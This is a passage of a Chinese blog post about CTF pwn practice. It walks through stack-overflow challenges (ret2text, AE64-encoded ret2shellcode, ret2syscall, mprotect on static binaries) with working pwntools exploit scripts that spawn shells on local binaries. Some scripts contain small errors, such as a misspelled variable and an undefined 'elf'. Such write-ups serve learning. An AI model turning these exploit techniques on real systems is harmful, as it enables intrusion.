@@ -1,0 +1,491 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Pwn学习记录 | Buchiyali's Blog</title><meta name="author" content="不吃压力"><meta name="copyright" content="不吃压力"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="学 Pwn 两个月做下来的一些比较经典的题：栈溢出、ret2libc、PIE 与格式化字符串。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwn学习记录">
+<meta property="og:url" content="https://buchiyali.github.io/2026/10/31/pwn-study-log/index.html">
+<meta property="og:site_name" content="Buchiyali&#39;s Blog">
+<meta property="og:description" content="学 Pwn 两个月做下来的一些比较经典的题：栈溢出、ret2libc、PIE 与格式化字符串。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://buchiyali.github.io/img/butterfly-icon.png">
+<meta property="article:published_time" content="2026-10-31T02:45:00.000Z">
+<meta property="article:modified_time" content="2026-10-31T02:45:00.000Z">
+<meta property="article:author" content="不吃压力">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="栈溢出">
+<meta property="article:tag" content="ret2libc">
+<meta property="article:tag" content="ret2syscall">
+<meta property="article:tag" content="ret2shellcode">
+<meta property="article:tag" content="格式化字符串">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://buchiyali.github.io/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Pwn学习记录",
+  "url": "https://buchiyali.github.io/2026/10/31/pwn-study-log/",
+  "image": "https://buchiyali.github.io/img/butterfly-icon.png",
+  "datePublished": "2026-10-31T02:45:00.000Z",
+  "dateModified": "2026-10-31T02:45:00.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "不吃压力",
+      "url": "https://buchiyali.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://buchiyali.github.io/2026/10/31/pwn-study-log/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.3.1/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        const data = { value }
+
+        if (ttl != null) {
+          data.expiry = Date.now() + ttl * 86400000
+        }
+
+        localStorage.setItem(key, JSON.stringify(data))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return
+
+        try {
+          const data = JSON.parse(itemStr)
+
+          if (data.expiry && Date.now() > data.expiry) {
+            localStorage.removeItem(key)
+            return
+          }
+
+          return data.value
+        } catch {
+          localStorage.removeItem(key)
+        }
+      }
+    }
+
+    const scriptCache = new Map()
+    const cssCache = new Map()
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => {
+        if (scriptCache.has(url)) {
+          return scriptCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+
+          script.src = url
+          script.async = true
+
+          for (const key in attr) {
+            script.setAttribute(key, attr[key])
+          }
+
+          script.onload = resolve
+          script.onerror = reject
+
+          document.head.appendChild(script)
+        })
+
+        scriptCache.set(url, promise)
+
+        return promise
+      },
+      getCSS: (url, id) => {
+        if (cssCache.has(url)) {
+          return cssCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+
+          link.rel = 'stylesheet'
+          link.href = url
+
+          if (id) {
+            link.id = id
+          }
+
+          link.onload = resolve
+          link.onerror = reject
+
+          document.head.appendChild(link)
+        })
+
+        cssCache.set(url, promise)
+
+        return promise
+      },
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const metaThemeColor = document.querySelector('meta[name="theme-color"]')
+      const activateDarkMode = () => {
+        document.documentElement.dataset.theme = 'dark'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.dataset.theme = 'light'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Pwn学习记录',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/home-bg.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Buchiyali's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Pwn学习记录</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">Pwn学习记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-10-31T02:45:00.000Z" title="发表于 2026-10-31 10:45:00">2026-10-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-10-31T02:45:00.000Z" title="更新于 2026-10-31 10:45:00">2026-10-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Pwn/">Pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="内容索引"><a href="#内容索引" class="headerlink" title="内容索引"></a>内容索引</h2><table>
+<thead>
+<tr>
+<th align="center">#</th>
+<th>文章</th>
+<th>核心技术点</th>
+<th>创建时间</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">1</td>
+<td><a href="#1-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%BB%83%E4%B9%A0-%E4%B8%80%E4%B8%AA%E7%89%B9%E5%88%AB%E7%9A%84ret2text">栈溢出练习(一个特别的ret2text)</a></td>
+<td>循环读入覆盖计数器 i、栈对齐后跳后门</td>
+<td>2026-09-20</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td><a href="#2-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%BB%83%E4%B9%A0-ret2shellcode">栈溢出练习(ret2shellcode)</a></td>
+<td>AE64 字母数字 shellcode，绕字符过滤 + strcpy</td>
+<td>2026-09-21</td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td><a href="#3-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%BB%83%E4%B9%A0-ret2syscall">栈溢出练习(ret2syscall)</a></td>
+<td>int 0x80 &#x2F; syscall，pop 链布置寄存器</td>
+<td>2026-09-22</td>
+</tr>
+<tr>
+<td align="center">4</td>
+<td><a href="#4-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91%E4%B8%8B%E5%88%A9%E7%94%A8mprotect">栈溢出学习(静态编译下利用mprotect)</a></td>
+<td>静态编译 mprotect 改权限 + read 写 shellcode</td>
+<td>2026-09-24</td>
+</tr>
+<tr>
+<td align="center">5</td>
+<td><a href="#5-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%BB%83%E4%B9%A0-ret2libc-%EF%BC%88pwn4%EF%BC%89">栈溢出练习(ret2libc)（pwn4）</a></td>
+<td>puts GOT 泄露 + LibcSearcher，\x00 截断 strlen 绕检测</td>
+<td>2026-09-25</td>
+</tr>
+<tr>
+<td align="center">6</td>
+<td><a href="#6-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%BB%83%E4%B9%A0-ret2libc-%EF%BC%88ezrop64%EF%BC%89">栈溢出练习(ret2libc)（ezrop64）</a></td>
+<td>printf 直接打印 puts 地址，int() 解析十六进制</td>
+<td>2026-09-26</td>
+</tr>
+<tr>
+<td align="center">7</td>
+<td><a href="#7-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%BB%83%E4%B9%A0-ret2libc2019CISCN">栈溢出练习(ret2libc2019CISCN)</a></td>
+<td>encrypt 加密检测绕过，两次 recvuntil 吃回显</td>
+<td>2026-09-26</td>
+</tr>
+<tr>
+<td align="center">8</td>
+<td><a href="#8-0xGame%E9%83%A8%E5%88%86Pwn%E9%A2%98%E9%A2%98%E8%A7%A3">0xGame部分Pwn题题解</a></td>
+<td>PIE 下泄露 win 地址、read&#x2F;send 与 p32&#x2F;p64 的选择</td>
+<td>2026-09-28</td>
+</tr>
+<tr>
+<td align="center">9</td>
+<td><a href="#9-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-n%E5%86%99%E5%85%A5">字符串格式化漏洞学习(%n写入)</a></td>
+<td>参数定位、%n 写入、小端序与填充</td>
+<td>2026-10-03</td>
+</tr>
+<tr>
+<td align="center">10</td>
+<td><a href="#10-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E-getshell">字符串格式化漏洞(getshell)</a></td>
+<td>改 printf GOT、泄露 libc 后回改 GOT</td>
+<td>2026-10-05</td>
+</tr>
+</tbody></table>
+<h2 id="学习路线"><a href="#学习路线" class="headerlink" title="学习路线"></a>学习路线</h2><p>整本知识库的推进脉络大致是三层：</p>
+<h3 id="栈溢出：从-ret2text-到-ret2libc"><a href="#栈溢出：从-ret2text-到-ret2libc" class="headerlink" title="栈溢出：从 ret2text 到 ret2libc"></a>栈溢出：从 ret2text 到 ret2libc</h3><p>先打通最基础的返回地址覆盖（<code>ret2text</code>），再依次补上四类绕过手段：</p>
+<ul>
+<li><strong>NX 拦截栈上执行</strong> → <code>ret2shellcode</code>（配合程序自带 <code>mprotect</code>&#x2F;写入点）、<code>ret2syscall</code>（直接 <code>int 0x80</code> &#x2F; <code>syscall</code> 走 <code>execve</code>）；</li>
+<li><strong>静态编译无 libc</strong> → 用 <code>mprotect</code> 把 <code>.bss</code>&#x2F;<code>.data</code> 改成可执行，再 <code>read</code> 写入 shellcode；</li>
+<li><strong>开 NX 且动态链接</strong> → <code>ret2libc</code>：泄露 GOT 表函数地址、算 libc 基址，回跳再打 <code>system(&quot;/bin/sh&quot;)</code>；</li>
+<li><strong>程序自带加密&#x2F;长度校验</strong> → 用 <code>\x00</code> 截断 <code>strlen</code>、<code>gets</code> 绕过检测那一套。</li>
+</ul>
+<h3 id="PIE-与真实比赛题"><a href="#PIE-与真实比赛题" class="headerlink" title="PIE 与真实比赛题"></a>PIE 与真实比赛题</h3><p><code>0xGame</code> 题解把前面的知识放进比赛环境：开 PIE 时 IDA 里的地址只是偏移，需要先泄露 <code>win</code> 实际地址再算 <code>base</code>；同时涉及 <code>read</code> 不额外补 <code>\n</code>、<code>p32</code>&#x2F;<code>p64</code> 要跟着目标变量宽度走、以及栈对齐。</p>
+<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>两篇 <code>printf</code> 系列从原理讲到实战：先定位用户输入落在栈上第几个参数，再用 <code>%n</code> 写 4 字节（<code>%hn</code>&#x2F;<code>%hhn</code> 写 2&#x2F;1 字节）；进阶用法是改 <code>printf</code> 的 GOT 指向 <code>system</code>，或先泄露 <code>printf</code> 在 libc 的地址再回头改 GOT。</p>
+<hr>
+<h2 id="1-栈溢出练习-一个特别的ret2text"><a href="#1-栈溢出练习-一个特别的ret2text" class="headerlink" title="1. 栈溢出练习(一个特别的ret2text)"></a>1. 栈溢出练习(一个特别的ret2text)</h2><blockquote>
+<p>原文：<a target="_blank" rel="noopener" href="https://www.yuque.com/buchiyali-eknnb/ppfgei/oh2xhfeev9q0417e">栈溢出练习(一个特别的ret2text)</a> · 创建 2026-09-20 · 最后更新 2026-09-28</p>
+</blockquote>
+<p>看IDA的反编译结果</p>
+<p><img src="/img/pwn-wp/img-01.png"></p>
+<p>path1函数中有system(“&#x2F;bin&#x2F;sh”)，ret2text无疑了，但这题陷阱在fuc函数中</p>
+<p><img src="/img/pwn-wp/img-02.png"></p>
+<p>可以看懂for循环内的逻辑，其实就是一个一个字符的录入，从而达到一串数据输入的效果，看起来就是正常的ret2text，但是陷阱就在这，看一下v1[56]，v2，i几个变量在栈上的分布</p>
+<p><img src="/img/pwn-wp/img-03.png"></p>
+<p>可以看到栈上的分布是从高地址到低地址分别是i，v2，v1[56]如果按照常规思路做的话，那么就会覆盖掉i的地址，然而我们for循环中要通过i来输入数据给v1，这样就会导致无法正常执行，因此我们要想办法改变i处地址的值，这里先计算从v1到i的距离0x40 - 0x04，然后我们要更改i处的值为71，这样在这个值被输入后还要经历一次循环才能输入后门函数地址，而此时i自增一次变成72，恰好是v1到返回地址的距离</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./trick&#x27;)</span><br><span class="line">backdoor = 0x4011E2</span><br><span class="line"></span><br><span class="line">offset = 0x40 - 0x04</span><br><span class="line">payload = b&#x27;A&#x27; * offset + b&#x27;\x47&#x27; + p64(backdoor)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里还要注意两个细节为什么用b’\x47’而不用p64(0x47)，b’\x47’只有这一个字节码，但是p64(0x47) &#x3D; \x47\x00\x00\x00\x00\x00\x00\x00发送的是八个字节码，\x00会把后面原本给后门函数留的地址占用，从而破坏了结构，第二个细节为什么后门函数地址是0x4011E2而不是path1的直接地址0x4011DD，看path1的汇编代码</p>
+<p><img src="/img/pwn-wp/img-04.png"></p>
+<p>如果直接用0x4011DD那么下一步push就会破坏栈对齐，导致无法getshell，因此从0x4011E2开始是为了栈对齐，不过如果硬要用0x4011DD的话，可以用ROPgadget找到ret的地址进行对齐，这个payload就是如下形式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ret_addr = 0x40101a</span><br><span class="line">path1_addr = 0x4011DD</span><br><span class="line">payload = b&#x27;A&#x27; * offset + b&#x27;\x47&#x27; + p64(ret_addr) + p64(path1_addr)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="2-栈溢出练习-ret2shellcode"><a href="#2-栈溢出练习-ret2shellcode" class="headerlink" title="2. 栈溢出练习(ret2shellcode)"></a>2. 栈溢出练习(ret2shellcode)</h2><blockquote>
+<p>原文：<a target="_blank" rel="noopener" href="https://www.yuque.com/buchiyali-eknnb/ppfgei/cdlqdc9xt33ebq2f">栈溢出练习(ret2shellcode)</a> · 创建 2026-09-21 · 最后更新 2026-09-22</p>
+</blockquote>
+<p>先查看文件信息</p>
+<p><img src="/img/pwn-wp/img-05.png"></p>
+<p>从防护机制看发现NX这个保护是打开的，那正常来讲注入shellcode的可能性不大，但是这个题有点特殊，在IDA里面看一下</p>
+<p><img src="/img/pwn-wp/img-06.png"></p>
+<p>这里我们可以看一下C语言的伪代码，注意到mprotect函数在一片内存空间上赋予了最高权限，并且很容易注意到漏洞点read函数处，限定的范围大小远大于s定义的大小会造成溢出，然后这个for循环处是一个保护机制用于检查输入字符长度并会过滤掉一些特殊字符（ASCII码小于等于47和大于122的字符），然后会把s的内容通过strcpy函数复制到buff中，最后调用buff，那么思路很明确了，因为最后执行的地方其实不在栈上，所以一开始的NX保护也就不会起作用，只要把shellcode写入s同时要绕过检测就行（这里有一个容易犯的错误思路，就是先用b’\0’来绕过，这个确实能绕过检测，但是strcpy函数检测到\0也会停止执行，导致shellcode无法到达buff中，事实上string.h这个标准库中大多数函数遇到\0都会停止操作），这里采用ae64来构造shellcode绕过检测</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ae64 import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./shellcoder&#x27;)</span><br><span class="line">#p = remote()</span><br><span class="line">context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.amd64.sh())</span><br><span class="line">payload = AE64().encode(shellcode,&#x27;rax&#x27;)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以拿到flag了，不过这里依旧有几个细节要注意，第一个最后用send而不是sendline，sendline会自动发送一个\n，而\n的ascii码是10，会被for循环中的检测抓住从而getshell失败，第二个问题为什么要加参数rax，如何确定rax寄存器</p>
+<p><img src="/img/pwn-wp/img-07.png"></p>
+<p>ae64编码出来的是一段“自修改代码”，开头是一段纯字母数字的解码器后面才是原始的shellcode，加寄存器这个参数就是为了告诉解码器自己在哪去找shellcode，这里shellcode最后是存在buff中的，然后调用的也是buff，而我们可以看到buff在rax寄存器中调用，因此寄存器写的rax</p>
+<p>最后简单记一下，ae64这个工具是一个自修改代码的工具，可以把amd64架构的shellcode转换成纯字母数字的shellcode，要使用ae64也要保证shellcode所在的内存页是可写的（W），并且程序输入口只放行字母数字类，然后还要有类似于这道题的已经把目标地址放入了某个寄存器的条件</p>
+<hr>
+<h2 id="3-栈溢出练习-ret2syscall"><a href="#3-栈溢出练习-ret2syscall" class="headerlink" title="3. 栈溢出练习(ret2syscall)"></a>3. 栈溢出练习(ret2syscall)</h2><blockquote>
+<p>原文：<a target="_blank" rel="noopener" href="https://www.yuque.com/buchiyali-eknnb/ppfgei/agov4g1dkd8qq9dl">栈溢出练习(ret2syscall)</a> · 创建 2026-09-22 · 最后更新 2026-10-03</p>
+</blockquote>
+<p>先看文件信息</p>
+<p><img src="/img/pwn-wp/img-08.png"></p>
+<p>可以看到没有任何保护开启</p>
+<p><img src="/img/pwn-wp/img-09.png"></p>
+<p>很容易找到溢出点，直接利用ret2syscall就行，32位的ret2syscall是利用int 0x80的软中断从用户态进入内核态从而调用系统函数execve，而32位的系统调用参数传递顺序是ebx,ecx,edx，系统调用号用eax装，因为execve的系统调用号是0x0b，因此eax要传入0x0b，而execve(filename,argv,envp)，第一个参数是可执行文件路径，第二个是传给新程序的命令行参数（例如-r  -n之类的）只有读到NULL才结束，第三个参数是传给新程序的环境变量同样是以NULL结束，因此只需要execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)就可以拿到shell，因此ebx传入&#x2F;bin&#x2F;sh的地址，剩下两个寄存器传入0即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./03ret2syscall_32 --only &quot;pop|ret&quot;</span><br><span class="line">ROPgadget --binary ./03ret2syscall_32 --only &quot;int&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这两行用来找寄存器地址和int 0x80的地址，最后写exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./03ret2syscall_32&#x27;)</span><br><span class="line">#p = remote()</span><br><span class="line"></span><br><span class="line">offset = 0x04 + 0x208</span><br><span class="line">int_0x80 = 0x0806cea3</span><br><span class="line">pop3_ret = 0x0806f250</span><br><span class="line">binsh_addr = 0x080ea068</span><br><span class="line">eax_ret = 0x080b8576</span><br><span class="line"></span><br><span class="line">payload = b&#x27;A&#x27; * offset</span><br><span class="line">payload += p32(pop3_ret) + p32(0) + p32(0) + p32(binsh_addr)</span><br><span class="line">payload += p32(eax_ret) + p32(0x0b)</span><br><span class="line">paylaod += p32(int_0x80)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以拿到flag了，同样有两个细节，构造payload的时候先放寄存器地址再放参数地址，这样pop指令才能把栈上的数据弹入寄存器中，然后先传入参数再调用函数，否则先放函数地址的话找不到参数也就拿不到shell权限</p>
+<p>最后说一下64位的ret2syscall，其实思路差不多，都是通过软中断陷入内核态调用系统函数，区别就是64位的系统调用参数的传递顺序是rdi,rsi,rdx,r10,r8和r9，系统调用号用rax装，除此外64位的软中断指令是syscall，然后execve函数的系统调用号是0x3b，payload的构造模板大致如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;A&#x27; * offset</span><br><span class="line">payload += p64(pop3_ret) + p64(0) + p64(0) + p64(binsh_addr)</span><br><span class="line">payload += p64(rax_addr) + p64(0x3b)</span><br><span class="line">payload += p64(syscall_addr)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="4-栈溢出学习-静态编译下利用mprotect"><a href="#4-栈溢出学习-静态编译下利用mprotect" class="headerlink" title="4. 栈溢出学习(静态编译下利用mprotect)"></a>4. 栈溢出学习(静态编译下利用mprotect)</h2><blockquote>
+<p>原文：<a target="_blank" rel="noopener" href="https://www.yuque.com/buchiyali-eknnb/ppfgei/ngbxdwiriwzepyy0">栈溢出学习(静态编译下利用mprotect)</a> · 创建 2026-09-24 · 最后更新 2026-09-24</p>
+</blockquote>
+<h3 id="mprotect函数"><a href="#mprotect函数" class="headerlink" title="mprotect函数"></a>mprotect函数</h3><p>mprotect函数是C语言中一个用来修改内存空间权限的函数，mprotect(start,len,prot)其中第一个参数是内存空间起始地址通常是一个段，第二个是内存空间长度，第三个是修改的权限</p>
+<p>额外记一下read函数，read(fd,buf,count)其中第一个表示要从哪个文件读取数据，第二参数表示一个映射到内存空间的指针，第三个是读取字节数</p>
+<h3 id="32位下的mprotect利用"><a href="#32位下的mprotect利用" class="headerlink" title="32位下的mprotect利用"></a>32位下的mprotect利用</h3><p>查看文件信息</p>
+<p><img src="/img/pwn-wp/img-10.png"></p>
+<p>这里发现栈保护NX是开启的，那么说明栈上不能直接注入shellcode，同时这不是一个动态可执行文件，意味着不能调用动态链接库通过libc解决了，下面在ida中看静态编译情况</p>
+<p><img src="/img/pwn-wp/img-11.png"></p>
+<p>ctfshow函数中很容看到溢出点，这题既然是利用mprotect函数来getshell，那么必须有可以写入的地方，通常是选取.bss段或者.data段，但是这两个段都没有可执行权限，因此我们就是要利用mprotect函数来修改权限，使得可以执行，同时如果只是修改了权限还是拿不到shell，因此我们还需要通过read函数来读取shellcode，那么思路就很清晰了，可以构造exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line">#p = remote()</span><br><span class="line"></span><br><span class="line">offset = 0x04 + 0x12</span><br><span class="line">mprotect_addr = 0x0806CDD0</span><br><span class="line">pop3_addr = 0x0806e011</span><br><span class="line">read_addr = elf.sym[&#x27;read&#x27;]</span><br><span class="line"></span><br><span class="line">mem_start = 0x080DB000</span><br><span class="line">mem_len = 0x1000</span><br><span class="line">mem_prot = 7</span><br><span class="line"></span><br><span class="line">payload = b&#x27;A&#x27; * offset</span><br><span class="line">payload += p32(mprotect_addr)</span><br><span class="line">payload += p32(pop3_addr)      #这里找了一个gadget:pop edx;pop ecx;pop ebx;ret来把mprotect函数原本的参数弹入寄存器中</span><br><span class="line">payload += p32(mem_start) + p32(mem_len) + p32(mem_prot)</span><br><span class="line">payload += p32(read_addr)</span><br><span class="line">payload += p32(mem_start)      #这里是要写入shellcode的地址，read函数的返回地址处</span><br><span class="line">payload += p32(0)      #这里开始是给read函数的参数</span><br><span class="line">payload += p32(mem_start)</span><br><span class="line">payload += p32(0x100)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="64位下mprotect函数的利用"><a href="#64位下mprotect函数的利用" class="headerlink" title="64位下mprotect函数的利用"></a>64位下mprotect函数的利用</h3><p>其实思路上来讲应该是完全一样的，但是由于函数调用传参的方式不一样，所以payload会有一点差异，这里给出一个64位的payload模板</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;A&#x27; * offset</span><br><span class="line">payload += p64(pop_rdi) + p64(mem_start)      #由于64位的参数前几个不在栈上，因此不需要像32位那样清栈</span><br><span class="line">payload += p64(pop_rsi) + p64(mem_len)</span><br><span class="line">payload += p64(pop_rdx) + p64(mem_prot)</span><br><span class="line">payload += p64(mprotect_addr)</span><br><span class="line">payload += p64(pop_rdi) + p64(0)</span><br><span class="line">payload += p64(pop_rsi) + p64(mem_start)</span><br><span class="line">payload += p64(pop_rdx) + p64(0x100)</span><br><span class="line">payload += p64(read_addr)</span><br><span class="line">payload += p64(mem_start)</span><br></pre></td></tr></table></figure>
+
+<p>具体情况可能更复杂，还需要考虑栈对齐之类的</p>
+<hr>
+<h2 id="5-栈溢出练习-ret2libc-（pwn4）"><a href="#5-栈溢出练习-ret2libc-（pwn4）" class="headerlink" title="5. 栈溢出练习(ret2libc)（pwn4）"></a>5. 栈溢出练习(ret2libc)（pwn4）</h2><blockquote>
